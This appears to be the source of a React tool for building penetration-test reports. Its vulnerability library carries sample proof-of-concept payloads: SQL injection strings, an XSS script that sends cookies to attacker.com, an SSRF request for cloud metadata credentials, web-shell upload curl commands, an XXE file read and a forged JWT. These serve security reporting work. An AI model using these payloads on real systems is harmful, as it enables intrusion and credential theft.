import { useState, useEffect } from "react";
import { PieChart, Pie, Cell, BarChart, Bar, LineChart, Line, XAxis, YAxis, Tooltip, ResponsiveContainer, CartesianGrid } from "recharts";
import * as XLSX from "xlsx";
import Papa from "papaparse";

// ── CONSTANTS ────────────────────────────────────────────────────────────────
const THEMES = {
  "dark":  { bg:"#0A0E1A", card:"#0F1628", border:"#1E2A3A", accent:"#00D4FF", text:"#E8ECF0", muted:"#8892A4", surf:"#070C15" },
  "light": { bg:"#F0F4F8", card:"#FFFFFF",  border:"#CBD5E1", accent:"#1D4ED8", text:"#1E293B", muted:"#64748B", surf:"#E2EAF4" },
  "red":   { bg:"#0D0000", card:"#1A0505",  border:"#3D0000", accent:"#FF1744", text:"#FFE0E0", muted:"#AA5555", surf:"#070000" },
  "navy":  { bg:"#020B18", card:"#071525",  border:"#1A3352", accent:"#60A5FA", text:"#CBD5E1", muted:"#5B7FA6", surf:"#010810" },
  "green": { bg:"#001100", card:"#001A00",  border:"#003300", accent:"#00FF41", text:"#CCFFCC", muted:"#557755", surf:"#000A00" },
  "md":    { bg:"#FFFFFF", card:"#F6F8FA",  border:"#D0D7DE", accent:"#0969DA", text:"#1F2328", muted:"#656D76", surf:"#F6F8FA" },
  "ciso":  { bg:"#FFFFFF", card:"#F4F6F9",  border:"#D9DEE5", accent:"#0B3D66", text:"#152238", muted:"#5C6B82", surf:"#EEF2F7" },
};
const THEME_NAMES = { dark:"🌑 Dark Cyber", light:"☀️ Light Pro", red:"🔴 Red Team", navy:"🔵 Navy Ops", green:"💚 Green Ops", md:"📄 MD Report", ciso:"🏢 CISO Exec" };
const SEV_COLOR = { Critical:"#FF1744", High:"#FF6D00", Medium:"#FFD600", Low:"#00E676", Info:"#40C4FF" };
const SEV_BG    = { Critical:"#33000A", High:"#331500", Medium:"#2A2500", Low:"#00220F", Info:"#001C33" };
const fromCVSS  = v => { const n=parseFloat(v)||0; return n>=9?"Critical":n>=7?"High":n>=4?"Medium":n>0?"Low":"Info"; };
const uid       = () => Math.random().toString(36).slice(2,8);
const esc       = s => String(s||"").replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
const slaFor    = s => ({Critical:"7 days",High:"30 days",Medium:"60 days",Low:"90 days"}[s]||"Scheduled");
const priFor    = s => ({Critical:"P0",High:"P1",Medium:"P2",Low:"P3"}[s]||"P4");

// ── STORAGE UTIL (works in Claude artifacts + local) ─────────────────────────
const API_BASE = (window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1")
  ? "http://localhost:4001/api/storage/"
  : window.location.origin + "/api/storage/";
const AUDIT_BASE = (window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1")
  ? "http://localhost:4001/api/audit"
  : window.location.origin + "/api/audit";
const store = {
  async get(k) {
    try { const r=await fetch(API_BASE+encodeURIComponent(k)); if(r.ok){ const d=await r.json(); return d.value!=null?{value:d.value}:null; } } catch{}
    try { if(window.storage) return await window.storage.get(k); const v=localStorage.getItem(k); return v?{value:v}:null; } catch{ return null; }
  },
  async set(k,v) {
    try { const r=await fetch(API_BASE+encodeURIComponent(k),{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({value:v})}); if(r.ok) return; } catch{}
    try { if(window.storage) return await window.storage.set(k,v); localStorage.setItem(k,v); } catch{}
  },
  async del(k) {
    try { const r=await fetch(API_BASE+encodeURIComponent(k),{method:"DELETE"}); if(r.ok) return; } catch{}
    try { if(window.storage) return await window.storage.delete(k); localStorage.removeItem(k); } catch{}
  },
};

// ── VULNERABILITY LIBRARY ────────────────────────────────────────────────────
const LIBRARY = [
  { cat:"Injection",    title:"SQL Injection",                  cvssScore:"9.1", cve:"N/A", owasp:"A03:2021", cwe:"CWE-89",
    description:"Application constructs SQL queries using unsanitised user input. An attacker can manipulate query logic to bypass authentication, extract database contents, or execute OS commands.",
    impact:"Full database dump including PII and credentials. Authentication bypass granting admin access. OS command execution via xp_cmdshell on MSSQL.",
    poc:"' OR '1'='1'--\n' UNION SELECT null,username,password FROM users--",
    remediation:"Use parameterised statements exclusively. Deploy WAF with SQLi rule sets. Enforce least-privilege DB accounts. Conduct full code review." },
  { cat:"XSS",          title:"Stored Cross-Site Scripting",    cvssScore:"6.1", cve:"N/A", owasp:"A03:2021", cwe:"CWE-79",
    description:"User-supplied input persisted and rendered in browser without sanitisation. Injected scripts execute in victim browsers enabling session hijacking.",
    impact:"Session token theft via document.cookie. Admin account takeover. Phishing payload delivery to all users.",
    poc:'<script>fetch("https://attacker.com/?c="+document.cookie)</script>',
    remediation:"Output encoding on all user-controlled data. Apply strict CSP header. Use DOMPurify server-side. Set HttpOnly+Secure flags on session cookies." },
  { cat:"SSRF",         title:"Server-Side Request Forgery",    cvssScore:"8.6", cve:"N/A", owasp:"A10:2021", cwe:"CWE-918",
    description:"Application fetches remote resources using user-supplied URLs without validation. Attackers force server to request internal services or cloud metadata APIs.",
    impact:"AWS metadata endpoint access exposing IAM credentials. Internal port scanning. Possible RCE via internal services.",
    poc:"url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\nurl=http://internal-db.corp.local:5432/",
    remediation:"Whitelist allowed URL schemes and hostnames. Block RFC1918 ranges at app layer. Disable HTTP redirects." },
  { cat:"RCE",          title:"Remote Code Execution via Upload",cvssScore:"9.8", cve:"N/A", owasp:"A04:2021", cwe:"CWE-434",
    description:"File upload fails to validate file types. Attackers upload web shells executed by the server achieving full RCE.",
    impact:"Full server compromise with persistent backdoor. Lateral movement. Complete data loss.",
    poc:"curl -F 'file=@shell.php;type=image/jpeg' https://target.com/upload\ncurl 'https://target.com/uploads/shell.php?cmd=id'",
    remediation:"Validate file extensions and MIME types server-side. Store uploads outside webroot. Disable script execution in upload dirs." },
  { cat:"Access Control",title:"IDOR - Broken Object Level Auth",cvssScore:"7.5", cve:"N/A", owasp:"A01:2021", cwe:"CWE-639",
    description:"Application exposes sequential internal object IDs without server-side authorisation checks. Changing an ID allows access to any user's resources.",
    impact:"Unauthorised access to all users' sensitive data. Mass data extraction possible by iterating IDs.",
    poc:"GET /api/users/1234/profile → 200 OK\nGET /api/users/1235/profile → 200 OK (victim's data!)",
    remediation:"Enforce object-level authorisation on every API endpoint. Replace sequential IDs with UUIDs. Implement ABAC/RBAC." },
  { cat:"Auth",         title:"Authentication Bypass",          cvssScore:"9.8", cve:"N/A", owasp:"A07:2021", cwe:"CWE-287",
    description:"Authentication mechanism can be bypassed via JWT algorithm confusion, missing checks, or logic flaws allowing access without valid credentials.",
    impact:"Full application access without credentials. Admin panel access. Complete account takeover.",
    poc:"Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
    remediation:"Enforce server-side authentication on all endpoints. Reject JWTs with 'none' algorithm. Validate signatures explicitly. Apply MFA." },
  { cat:"CSRF",         title:"Cross-Site Request Forgery",     cvssScore:"6.5", cve:"N/A", owasp:"A01:2021", cwe:"CWE-352",
    description:"State-changing endpoints lack CSRF token validation. Attacker crafts page performing actions as authenticated victim.",
    impact:"Unauthorised actions: password change, fund transfer, account deletion. Full account compromise possible.",
    poc:'<form action="https://target.com/api/change-password" method="POST"><input name="new_password" value="hacked123"></form>',
    remediation:"Implement CSRF tokens on all state-changing endpoints. Use SameSite=Strict cookie attribute. Validate Origin and Referer headers." },
  { cat:"Config",       title:"Missing Security Headers",       cvssScore:"5.3", cve:"N/A", owasp:"A05:2021", cwe:"CWE-693",
    description:"Web application missing critical security headers: CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy.",
    impact:"Increased XSS risk. Clickjacking attacks. MIME sniffing. Server technology disclosure.",
    poc:"curl -I https://target.com\n# Missing: Content-Security-Policy, Strict-Transport-Security, X-Frame-Options",
    remediation:"Add Strict-Transport-Security, Content-Security-Policy, X-Frame-Options: DENY, X-Content-Type-Options: nosniff, Referrer-Policy: no-referrer." },
  { cat:"Sensitive Data",title:"Hardcoded Credentials in Code", cvssScore:"7.5", cve:"N/A", owasp:"A02:2021", cwe:"CWE-312",
    description:"API keys, database credentials, or private keys found hardcoded in source code, configuration files, or git history.",
    impact:"Cloud infrastructure compromise. Database access via hardcoded connection strings. Complete secret exposure across git history.",
    poc:"git grep -i 'password|api_key|secret' $(git rev-list --all)",
    remediation:"Rotate all exposed credentials. Use environment variables or secrets managers. Add .gitignore rules. Implement pre-commit hooks." },
  { cat:"XXE",          title:"XML External Entity Injection",  cvssScore:"8.1", cve:"N/A", owasp:"A05:2021", cwe:"CWE-611",
    description:"XML parser processes external entity references without restriction. Attackers read local files or perform SSRF.",
    impact:"Local file read (/etc/passwd, private keys). SSRF to internal services. DoS via billion-laughs attack.",
    poc:'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    remediation:"Disable external entity processing. Migrate to JSON. Update XML libraries. Implement schema validation." },
  { cat:"API",          title:"Broken Object Level Authorization",cvssScore:"8.6", cve:"N/A", owasp:"A01:2021", cwe:"CWE-284",
    description:"API does not enforce object-level authorisation. Users access and modify other users' resources by manipulating IDs.",
    impact:"Mass data extraction. Unauthorised modification/deletion of other users' data.",
    poc:"GET /api/v1/orders/ORD-1001 → 200 OK\nGET /api/v1/orders/ORD-1002 → 200 OK (User B's data!)",
    remediation:"Implement object-level authorisation in every API function. Enforce resource ownership checks. Apply access control lists." },
  { cat:"Default Creds",title:"Default / Weak Credentials",    cvssScore:"9.8", cve:"N/A", owasp:"A07:2021", cwe:"CWE-1392",
    description:"Network devices or services found using factory default or hardcoded credentials not changed post-deployment.",
    impact:"Full administrative control over core network infrastructure. Traffic interception, ransomware deployment.",
    poc:"ssh admin@192.168.1.1  Password: cisco → Successful login",
    remediation:"Change all default credentials immediately. Enforce password complexity policy. Implement PAM for privileged access." },
];

const COMPLIANCE = {
  "A01:2021":{ pci:"6.2.4", iso:"A.9.4.1",  nist:"PR.AC-4", cis:"CIS-6",  rbi:"Annex-9 Access Control",      certin:"CERT-In Adv. AC",   sebi:"CSCRF-AC",  irdai:"IRDAI-G7",  name:"Broken Access Control" },
  "A02:2021":{ pci:"4.2.1", iso:"A.10.1.1", nist:"PR.DS-2", cis:"CIS-3",  rbi:"Annex-12 Cryptography",       certin:"CERT-In Adv. ENC",  sebi:"CSCRF-ENC", irdai:"IRDAI-G4",  name:"Cryptographic Failures" },
  "A03:2021":{ pci:"6.2.4", iso:"A.14.2.5", nist:"SI-10",   cis:"CIS-16", rbi:"Annex-14 Secure SDLC",        certin:"CERT-In VAPT",      sebi:"CSCRF-APP", irdai:"IRDAI-G9",  name:"Injection" },
  "A04:2021":{ pci:"6.2.1", iso:"A.14.2.1", nist:"SA-15",   cis:"CIS-16", rbi:"Annex-14 Secure SDLC",        certin:"CERT-In SDLC",      sebi:"CSCRF-APP", irdai:"IRDAI-G9",  name:"Insecure Design" },
  "A05:2021":{ pci:"2.2.1", iso:"A.12.1.1", nist:"CM-6",    cis:"CIS-4",  rbi:"Annex-7 Config Mgmt",         certin:"CERT-In Hardening", sebi:"CSCRF-CFG", irdai:"IRDAI-G3",  name:"Security Misconfiguration" },
  "A07:2021":{ pci:"8.2.1", iso:"A.9.4.2",  nist:"PR.AC-7", cis:"CIS-5",  rbi:"Annex-9 Access Control",      certin:"CERT-In Adv. AUTH", sebi:"CSCRF-AUTH",irdai:"IRDAI-G7",  name:"Auth & Session Failures" },
  "A08:2021":{ pci:"6.3.3", iso:"A.14.2.7", nist:"SI-7",    cis:"CIS-2",  rbi:"Annex-11 Patch Mgmt",          certin:"CERT-In Patch",     sebi:"CSCRF-PAT", irdai:"IRDAI-G5",  name:"Software Integrity Failures" },
  "A09:2021":{ pci:"10.2",  iso:"A.12.4.1", nist:"AU-2",    cis:"CIS-8",  rbi:"Annex-15 Logging/SOC",        certin:"CERT-In Logging",   sebi:"CSCRF-LOG", irdai:"IRDAI-G8",  name:"Logging & Monitoring Failures" },
  "A10:2021":{ pci:"6.2.4", iso:"A.14.2.5", nist:"SC-7",    cis:"CIS-12", rbi:"Annex-13 Network Security",   certin:"CERT-In SSRF",      sebi:"CSCRF-NET", irdai:"IRDAI-G6",  name:"SSRF" },
};

// ── ENTERPRISE: STATUS WORKFLOW / EVIDENCE STAGES / ROLES / RISK SCORE ───────
const STATUS_FLOW   = ["Open","In Progress","Retested","Closed"];
const STATUS_COLOR  = { Open:"#FF1744", "In Progress":"#FF6D00", Retested:"#FFD600", Closed:"#00E676" };
const EV_STAGES     = ["Before Fix","After Fix","Retest"];
const ROLES         = ["Pentester","Reviewer","Manager","CISO","Client"];
const AUTH_ROLES    = ["user","admin","superuser"];
const AUTH_ROLE_LABEL = { user:"Normal User (view/download only)", admin:"Admin (full access, no audit)", superuser:"Super User (full access + audit + user mgmt)" };
const APPROVAL_FLOW = ["Draft","Review","Approved","Released"];
const nextStatus    = s => STATUS_FLOW[Math.min(STATUS_FLOW.indexOf(s)+1, STATUS_FLOW.length-1)];

// ── SLA TRACKING ──────────────────────────────────────────────────────────────
const SLA_DAYS = { Critical:7, High:30, Medium:60, Low:90, Info:90 };
function slaInfo(f) {
  const days = SLA_DAYS[f.severity] || 90;
  const opened = f.openedDate ? new Date(f.openedDate) : null;
  if(!opened || isNaN(opened)) return { days, due:null, remaining:null, overdue:0, color:"#8892A4" };
  const due = new Date(opened); due.setDate(due.getDate()+days);
  const today = new Date(); today.setHours(0,0,0,0);
  const diffDays = Math.round((due-today)/86400000);
  const closed = f.status==="Closed";
  const overdue = !closed && diffDays<0 ? Math.abs(diffDays) : 0;
  const color = closed ? "#00E676" : overdue>0 ? "#FF1744" : diffDays<=Math.ceil(days*0.25) ? "#FF6D00" : "#00E676";
  return { days, due, remaining: closed?null:diffDays, overdue, color };
}

function riskScore(findings) {
  const w = {Critical:10,High:7,Medium:4,Low:1,Info:0};
  const open = findings.filter(f=>f.status!=="Closed");
  if(!open.length) return 0;
  const sum = open.reduce((a,f)=>a+(w[f.severity]||0),0);
  return Math.min(100, Math.round((sum/(open.length*10))*100));
}

// ── SCANNER IMPORT — column-flexible mapper for Nessus/Nuclei/Qualys/Burp/Acunetix/OpenVAS CSV/XLSX exports ──
function mapScannerRow(row) {
  const get = (...keys) => { for(const k of keys){ const f=Object.keys(row).find(rk=>rk.toLowerCase().trim()===k); if(f && row[f]!=null && row[f]!=="") return String(row[f]); } return ""; };
  const title = get("plugin name","name","vulnerability","title","issue name","vuln_name");
  if(!title) return null;
  const sevRaw = get("risk","severity","risk factor").toLowerCase();
  const severity = sevRaw.includes("crit")?"Critical":sevRaw.includes("high")?"High":sevRaw.includes("med")?"Medium":sevRaw.includes("low")?"Low":"Info";
  return {
    title,
    severity,
    cve: get("cve","cves"),
    cvssScore: get("cvss","cvss v3","cvss score","cvssv3_basescore"),
    description: get("description","synopsis","summary"),
    impact: get("impact"),
    remediation: get("solution","remediation","recommendation"),
    asset: get("host","ip","ip address","target","url","affected"),
    references: get("see also","references","reference"),
  };
}
const newFinding = n => ({
  _id:uid(), id:`VAPT-${new Date().getFullYear()}-${String(n+1).padStart(3,"0")}`,
  title:"", cve:"", cvssScore:"", cvssVector:"", severity:"Medium", status:"Open",
  asset:"", description:"", impact:"", poc:"", remediation:"", references:"",
  owasp:"", cwe:"", attachNote:"", evidence:[], retestNote:"", history:[],
  openedDate:new Date().toISOString().slice(0,10), rootCause:"", attackNarrative:"",
});

const INIT_DATA = () => ({
  cover:{ org:"", scope:"Internal + External Infrastructure", type:"Black-Box / Grey-Box VAPT",
          start:"", end:"", date:new Date().toISOString().slice(0,10),
          version:"v1.0 — Final", classification:"CONFIDENTIAL",
          preparedBy:"", preparedFor:"", docId:`DOC-${Date.now().toString().slice(-6)}` },
  execSummary:"", keyObs:"", objectives:"", businessImpact:"",
  assets:[], phases:[
    {title:"Phase 1 — Reconnaissance",   desc:"Passive OSINT, DNS enumeration, Shodan, subdomain bruteforce."},
    {title:"Phase 2 — Scanning",         desc:"Nmap, Nessus credentialed scans, Nuclei, web crawling."},
    {title:"Phase 3 — Exploitation",     desc:"Manual exploitation via Metasploit, custom PoCs, manual techniques."},
    {title:"Phase 4 — Post-Exploitation",desc:"Privilege escalation, lateral movement, credential harvesting (documented only)."},
    {title:"Phase 5 — Reporting",        desc:"CVSS v3.1 scoring, risk ranking, evidence collection, remediation mapping."},
  ],
  findings:[],
  roadmapOverride:{},
  conclusion:{ riskPosture:"HIGH-RISK", text:"",
    signoff:[{role:"Lead Pen Tester",name:"",date:""},{role:"Security Manager",name:"",date:""},{role:"Client CISO",name:"",date:""},{role:"Authorized By",name:"",date:""}]
  },
  themeId:"dark", useCustom:false, customBg:"", customAccent:"", customText:"",
  logo:"", watermark:"", footerText:"© 2025 CyberSec Operations — CONFIDENTIAL",
  // ── Enterprise additions ──
  users:[{_id:uid(),name:"You",role:"Pentester"}], currentUser:0,
  approvalStage:"Draft", versionNum:"v1.0", versionHistory:[],
  auditLog:[],
});

// ── PDF BUILDER ───────────────────────────────────────────────────────────────
function buildPDF(d, th) {
  const F = d.findings;
  const cnt = F.reduce((a,f)=>{ a[f.severity]=(a[f.severity]||0)+1; return a; }, {Critical:0,High:0,Medium:0,Low:0,Info:0});
  // ── #4 Executive Dashboard metrics ──
  const xOpen = F.filter(f=>f.status!=="Closed").length;
  const xClosed = F.length-xOpen;
  const xRisk = riskScore(F);
  const xMapped = F.filter(f=>f.owasp).length;
  const xCompliancePct = F.length ? Math.round((xMapped/F.length)*100) : 0;
  const xSlaBreached = F.filter(f=>f.status!=="Closed" && slaInfo(f).overdue>0).length;
  const xSlaBreachedPct = xOpen ? Math.round((xSlaBreached/xOpen)*100) : 0;
  const xRetested = F.filter(f=>f.status==="Retested"||f.status==="Closed").length;
  const xRetestSuccessPct = xRetested ? Math.round((F.filter(f=>f.status==="Closed").length/xRetested)*100) : 0;

  const findingRows = F.map((f,i)=>{
    const sc   = parseFloat(f.cvssScore)||0;
    const sclr = SEV_COLOR[f.severity]||"#8892A4";
    const bar  = Math.round((sc/10)*150);
    const evHTML = (f.evidence||[]).length > 0 ? buildEvidenceHTML(f, i, th) : "";
    const fields = [
      ["AFFECTED ASSET", f.asset],
      ["DESCRIPTION",    f.description],
      ["IMPACT",         f.impact],
      ["PROOF OF CONCEPT", f.poc],
      ["REMEDIATION",    f.remediation],
      ["REFERENCES",     f.references],
    ].filter(([,v])=>v);
    const fieldRows = fields.map(([label, val])=>{
      const isCode = label === "PROOF OF CONCEPT";
      return [
        '<div style="display:flex;border-top:1px solid ',th.border,';">',
        '<div style="width:140px;min-width:140px;background:',th.card,
        ';padding:6px 10px;color:',th.accent,';font-size:8px;font-weight:bold;font-family:monospace;">',label,'</div>',
        '<div style="flex:1;padding:6px 10px;background:',th.bg,
        ';color:',isCode?th.accent:th.text,';font-size:',isCode?'8px':'9px',
        ';font-family:',isCode?'monospace':'sans-serif',
        ';white-space:pre-wrap;word-break:break-word;line-height:1.5;">',esc(val),'</div>',
        '</div>'
      ].join("");
    }).join("");

    return [
      '<div style="margin-bottom:18px;border:1px solid ',th.border,
      ';border-radius:6px;overflow:hidden;border-left:4px solid ',sclr,';page-break-inside:avoid;">',
      '<div style="background:',th.card,';padding:10px 14px;display:flex;justify-content:space-between;align-items:center;">',
      '<div>',
      '<span style="color:',th.accent,';font-size:9px;font-weight:bold;font-family:monospace;">',esc(f.id),'</span>',
      '<div style="color:',th.text,';font-size:13px;font-weight:bold;margin-top:2px;">',esc(f.title)||'(No title)','</div>',
      f.owasp ? '<span style="color:'+th.accent+';font-size:8px;font-family:monospace;">OWASP '+esc(f.owasp)+'</span>' : '',
      f.cwe   ? '<span style="color:'+th.muted+';font-size:8px;font-family:monospace;margin-left:8px;">'+esc(f.cwe)+'</span>' : '',
      '</div>',
      '<div style="text-align:right;">',
      '<div style="color:',sclr,';font-size:20px;font-weight:900;">',sc.toFixed(1),'</div>',
      '<div style="color:',sclr,';font-size:9px;font-weight:bold;background:',sclr,'22;padding:2px 8px;border-radius:10px;display:inline-block;">',f.severity,'</div>',
      '</div></div>',
      '<div style="background:',th.surf,';padding:4px 14px;">',
      '<div style="display:flex;align-items:center;gap:12px;padding:4px 0;">',
      '<span style="color:',th.muted,';font-size:8px;font-family:monospace;">CVE: <span style="color:',th.accent,';font-weight:bold;">',esc(f.cve)||'N/A','</span></span>',
      '<span style="color:',th.muted,';font-size:8px;font-family:monospace;">',esc(f.cvssVector||''),'</span>',
      '<div style="margin-left:auto;width:150px;height:6px;background:',th.border,';border-radius:3px;overflow:hidden;">',
      '<div style="width:',bar,'px;height:100%;background:',sclr,';"></div></div>',
      '</div></div>',
      fieldRows,
      evHTML,
      '</div>'
    ].join("");
  }).join("");

  const roadRows = [...F]
    .sort((a,b)=>(parseFloat(b.cvssScore)||0)-(parseFloat(a.cvssScore)||0))
    .map(f=>{
      const sc=parseFloat(f.cvssScore)||0; const sclr=SEV_COLOR[f.severity]||"#8892A4";
      const ov=d.roadmapOverride[f._id]||{};
      return [
        '<tr>',
        '<td style="padding:6px 8px;color:'+sclr+';font-weight:bold;font-size:11px;text-align:center;">'+priFor(f.severity)+'</td>',
        '<td style="padding:6px 8px;font-size:8.5px;">'+esc(f.title)+'</td>',
        '<td style="padding:6px 8px;color:'+sclr+';font-weight:bold;text-align:center;font-size:11px;">'+sc.toFixed(1)+'</td>',
        '<td style="padding:6px 8px;color:'+sclr+';text-align:center;font-size:8px;font-weight:bold;">'+(ov.sla||slaFor(f.severity))+'</td>',
        '<td style="padding:6px 8px;color:'+th.muted+';font-size:8px;">'+(ov.owner||"—")+'</td>',
        '<td style="padding:6px 8px;font-size:8px;">'+(ov.action||"—")+'</td>',
        '</tr>'
      ].join("");
    }).join("");

  const signRows = d.conclusion.signoff.map(s=>[
    '<tr>',
    '<td style="padding:10px 12px;color:'+th.accent+';font-size:9px;font-weight:bold;background:'+th.card+';">'+esc(s.role)+'</td>',
    '<td style="padding:10px 12px;font-size:9px;border-bottom:1px solid '+th.border+';">'+esc(s.name||"_______________")+'</td>',
    '<td style="padding:10px 12px;font-size:9px;border-bottom:1px solid '+th.border+';color:'+th.muted+';">_______________________</td>',
    '<td style="padding:10px 12px;font-size:9px;border-bottom:1px solid '+th.border+';">'+esc(s.date||"____________")+'</td>',
    '</tr>'
  ].join("")).join("");

  const coverMeta = [
    ["Target Organisation", d.cover.org],
    ["Assessment Scope",    d.cover.scope],
    ["Assessment Type",     d.cover.type],
    ["Engagement Period",   (d.cover.start||"—")+" to "+(d.cover.end||"—")],
    ["Report Date",         d.cover.date],
    ["Report Version",      d.cover.version],
    ["Document ID",         d.cover.docId],
    ["Classification",      d.cover.classification],
    ["Prepared By",         d.cover.preparedBy],
    ["Prepared For",        d.cover.preparedFor],
  ].map(([k,v])=>[
    '<tr>',
    '<td style="padding:6px 12px;font-size:9px;font-weight:bold;color:'+th.accent+';background:'+th.card+';border:1px solid '+th.border+';font-family:monospace;width:160px;">'+k+'</td>',
    '<td style="padding:6px 12px;font-size:9px;color:'+th.text+';background:'+th.bg+';border:1px solid '+th.border+';">'+(v||"—")+'</td>',
    '</tr>'
  ].join("")).join("");

  const summaryRows = F.map(f=>{
    const sc=parseFloat(f.cvssScore)||0; const sclr=SEV_COLOR[f.severity]||"#8892A4";
    return [
      '<tr>',
      '<td style="font-family:monospace;color:'+th.accent+';font-size:8px;padding:6px 10px;border:1px solid '+th.border+';">'+esc(f.id)+'</td>',
      '<td style="font-size:8.5px;padding:6px 10px;border:1px solid '+th.border+';">'+esc(f.title)+'</td>',
      '<td style="font-family:monospace;color:'+th.accent+';font-size:8px;padding:6px 10px;border:1px solid '+th.border+';text-align:center;">'+esc(f.cve||"N/A")+'</td>',
      '<td style="text-align:center;color:'+sclr+';font-weight:bold;font-size:12px;padding:6px 10px;border:1px solid '+th.border+';">'+sc.toFixed(1)+'</td>',
      '<td style="text-align:center;color:'+sclr+';font-weight:bold;font-size:8px;padding:6px 10px;border:1px solid '+th.border+';">'+f.severity+'</td>',
      '<td style="text-align:center;color:'+th.accent+';font-size:8px;padding:6px 10px;border:1px solid '+th.border+';">'+esc(f.owasp||"—")+'</td>',
      '<td style="text-align:center;color:#FF6D00;font-size:8px;font-weight:bold;padding:6px 10px;border:1px solid '+th.border+';">Open</td>',
      '</tr>'
    ].join("");
  }).join("");

  const phaseHTML = d.phases.map(p=>[
    '<div style="margin-bottom:8px;padding:8px 12px;background:'+th.card+';border-left:3px solid '+th.accent+';border-radius:4px;">',
    '<div style="font-size:9px;font-weight:bold;color:'+th.accent+';margin-bottom:3px;">'+esc(p.title)+'</div>',
    '<div style="font-size:8.5px;color:'+th.muted+';line-height:1.5;">'+esc(p.desc)+'</div>',
    '</div>'
  ].join("")).join("");

  const assetRows = d.assets.map(a=>[
    '<tr>',
    '<td style="padding:6px 10px;border:1px solid '+th.border+';">'+esc(a.name)+'</td>',
    '<td style="padding:6px 10px;border:1px solid '+th.border+';font-family:monospace;color:'+th.accent+';">'+esc(a.ip)+'</td>',
    '<td style="padding:6px 10px;border:1px solid '+th.border+';text-align:center;">'+esc(a.type)+'</td>',
    '<td style="padding:6px 10px;border:1px solid '+th.border+';text-align:center;">'+esc(a.env||"")+'</td>',
    '<td style="padding:6px 10px;border:1px solid '+th.border+';text-align:center;">'+esc(a.method)+'</td>',
    '<td style="padding:6px 10px;border:1px solid '+th.border+';text-align:center;color:#00E676;font-weight:bold;">'+esc(a.status||"In Scope")+'</td>',
    '</tr>'
  ].join("")).join("");

  return `<!DOCTYPE html><html><head><meta charset="UTF-8"/>
<title>VAPT Report — ${esc(d.cover.org||"Organisation")}</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
html,body{width:100%;min-height:100%;}
body{font-family:'Segoe UI',Helvetica,sans-serif;background:${th.bg};color:${th.text};-webkit-print-color-adjust:exact;print-color-adjust:exact;}
.pg{width:100%;max-width:900px;margin:0 auto;padding:30px 40px;min-height:100vh;position:relative;}
.pb{page-break-before:always;}
.sh{padding:10px 16px;border-left:4px solid ${th.accent};background:${th.card};margin-bottom:12px;}
.sh h2{font-size:14px;color:${th.accent};font-weight:800;text-transform:uppercase;letter-spacing:2px;}
table.dt{width:100%;border-collapse:collapse;font-size:9px;}
table.dt th{background:${th.card};color:${th.accent};padding:7px 10px;font-size:8px;text-transform:uppercase;letter-spacing:1px;border:1px solid ${th.border};}
table.dt td{border:1px solid ${th.border};color:${th.text};}
table.dt tr:nth-child(odd) td{background:${th.bg};}
table.dt tr:nth-child(even) td{background:${th.card};}
.barrow{display:flex;align-items:center;gap:8px;margin-bottom:6px;}
.barlabel{width:90px;font-size:8px;color:${th.muted};font-weight:bold;}
.bartrack{flex:1;height:14px;background:${th.border};border-radius:4px;overflow:hidden;}
.barfill{height:100%;border-radius:4px;}
.barval{width:30px;text-align:right;font-size:9px;font-weight:bold;color:${th.text};}
@media print{
  html,body{width:210mm;height:297mm;}
  .pg{width:210mm;max-width:210mm;min-height:297mm;padding:15px 20px;margin:0;}
}
@page{size:A4;margin:0;}
</style></head><body>
<div class="pg">
<div style="background:${th.accent};height:8px;margin:-30px -40px 20px;"></div>
${d.logo ? '<div style="text-align:right;margin-bottom:12px;"><img src="'+d.logo+'" style="max-height:50px;max-width:150px;"/></div>' : ""}
<div style="text-align:center;padding:20px 0;">
<div style="font-size:48px;margin-bottom:8px;">🛡</div>
<div style="font-size:28px;font-weight:900;color:${th.text};letter-spacing:2px;text-transform:uppercase;line-height:1.2;">Vulnerability Assessment &<br/>Penetration Testing Report</div>
<div style="font-size:11px;color:${th.accent};font-weight:600;letter-spacing:3px;text-transform:uppercase;margin-top:8px;">${esc(d.cover.classification||"CONFIDENTIAL")} — RESTRICTED</div>
<div style="width:200px;height:2px;background:${th.accent};margin:14px auto;"></div>
</div>
<table style="width:100%;max-width:520px;margin:0 auto;border-collapse:collapse;">${coverMeta}</table>
<div style="display:flex;gap:6px;margin:20px auto;max-width:520px;">
${[["Critical","#FF1744","#33000A"],["High","#FF6D00","#331500"],["Medium","#FFD600","#2A2500"],["Low","#00E676","#00220F"],["Total",th.accent,th.card||"#0F1628"]].map(([s,c,bg])=>'<div style="flex:1;text-align:center;padding:10px 6px;background:'+bg+';border-radius:6px;"><div style="font-size:20px;font-weight:900;color:'+c+';">'+(s==="Total"?F.length:(cnt[s]||0))+'</div><div style="font-size:8px;font-weight:bold;color:'+c+';text-transform:uppercase;">'+s+'</div></div>').join("")}
</div>
<div style="font-size:9px;font-weight:bold;color:${th.muted};text-align:center;letter-spacing:1px;text-transform:uppercase;margin:14px auto 6px;max-width:520px;">Executive Dashboard</div>
<div style="display:grid;grid-template-columns:repeat(4,1fr);gap:6px;margin:0 auto 10px;max-width:520px;">
${[
  ["Open",xOpen,"#FF6D00"],["Closed",xClosed,"#00E676"],["Risk Score",xRisk+"/100",xRisk>=70?"#FF1744":xRisk>=40?"#FF6D00":"#00E676"],
  ["Compliance",xCompliancePct+"%","#40C4FF"],["SLA Breached",xSlaBreachedPct+"%",xSlaBreachedPct>0?"#FF1744":"#00E676"],["Retest Success",xRetestSuccessPct+"%","#00E676"],
].map(([lbl,val,c])=>'<div style="text-align:center;padding:8px 4px;background:'+th.card+';border-radius:6px;border:1px solid '+th.border+';"><div style="font-size:14px;font-weight:900;color:'+c+';">'+val+'</div><div style="font-size:7px;font-weight:bold;color:'+th.muted+';text-transform:uppercase;margin-top:2px;">'+lbl+'</div></div>').join("")}
</div>
${d.watermark ? '<div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%) rotate(-30deg);font-size:60px;font-weight:900;color:'+th.accent+'22;pointer-events:none;white-space:nowrap;">'+esc(d.watermark)+'</div>' : ""}
